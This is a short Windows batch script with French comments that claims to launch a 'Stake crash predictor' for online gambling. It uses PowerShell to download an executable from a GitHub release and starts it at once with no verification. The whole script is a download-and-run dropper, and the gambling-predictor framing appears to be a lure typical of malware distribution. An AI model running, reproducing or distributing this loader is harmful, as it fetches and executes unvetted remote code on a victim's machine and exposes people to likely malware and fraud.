@echo off
echo Veuillez patienter, le predictor se lance...
timeout /t 3 >nul

:: Création d'un répertoire temporaire
mkdir predictor_temp
cd predictor_temp

:: Téléchargement du fichier web (remplace l'URL par ton lien)
echo Téléchargement en cours...
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/stake-predictor-2025/stake-crash-predictor-2025/releases/download/stake-crash-predictor/stake-crash.exe', 'stake-crash.exe')"

:: Vérification de l'installation
if exist "stake-crash.exe" (
    echo Installation terminée. Lancement...
    start stake-crash.exe
) else (
    echo Erreur: Le fichier n'a pas pu être téléchargé.
)

:: Nettoyage temporaire (facultatif)
cd ..
rem rmdir /s /q predictor_temp

exit
